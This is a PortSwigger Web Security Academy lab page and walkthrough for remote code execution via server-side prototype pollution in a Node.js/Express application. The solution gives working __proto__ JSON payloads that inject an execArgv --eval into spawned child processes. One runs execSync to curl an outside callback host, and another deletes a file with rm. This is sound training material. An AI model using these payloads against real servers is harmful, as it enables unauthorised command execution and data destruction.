# Lab: Remote code execution via server-side prototype pollution

Source: https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution
Fetched: 2026-06-28T09:17:59.138953+00:00

Web Security Academy

Prototype pollution

Server-side vulnerabilities

Lab

Lab: Remote code execution via server-side prototype pollution

This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.

Due to the configuration of the server, it's possible to pollute Object.prototype in such a way that you can inject arbitrary system commands that are subsequently executed on the server.

To solve the lab:

Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.

Identify a gadget that you can use to inject and execute arbitrary system commands.

Trigger remote execution of a command that deletes the file /home/carlos/morale.txt.

In this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: wiener:peter

Hint

The command execution sink is only invoked when an admin user triggers vulnerable functionality on the site.

Note

When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.

Solution

Study the address change feature

Log in and visit your account page. Submit the form for updating your billing and delivery address.

In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.

Observe that when you submit the form, the data from the fields is sent to the server as JSON. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.

Send the request to Burp Repeater.

Identify a prototype pollution source

In Repeater, add a new property to the JSON with the name __proto__, containing an object with a json spaces property.

"__proto__": {

"json spaces":10

}

Send the request.

In the Response panel, switch to the Raw tab. Notice that the JSON indentation has increased based on the value of your injected property. This strongly suggests that you have successfully polluted the prototype.

Probe for remote code execution

In the browser, go to the admin panel and observe that there's a button for running maintenance jobs.

Click the button and observe that this triggers background tasks that clean up the database and filesystem. This is a classic example of the kind of functionality that may spawn node child processes.

Try polluting the prototype with a malicious execArgv property that adds the --eval argument to the spawned child process. Use this to call the execSync() sink, passing in a command that triggers an interaction with the public Burp Collaborator server. For example:

"__proto__": {

"execArgv":[

"--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"

]

}

Send the request.

In the browser, go to the admin panel and trigger the maintenance jobs again. Notice that these have both failed this time.

In Burp, go to the Collaborator tab and poll for interactions. Observe that you have received several DNS interactions, confirming the remote code execution.

Craft an exploit

In Repeater, replace the curl command with a command for deleting Carlos's file:

"__proto__": {

"execArgv":[

"--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"

]

}

Send the request.

Go back to the admin panel and trigger the maintenance jobs again. Carlos's file is deleted and the lab is solved.

Find prototype pollution vulnerabilities using Burp Suite

Try for free
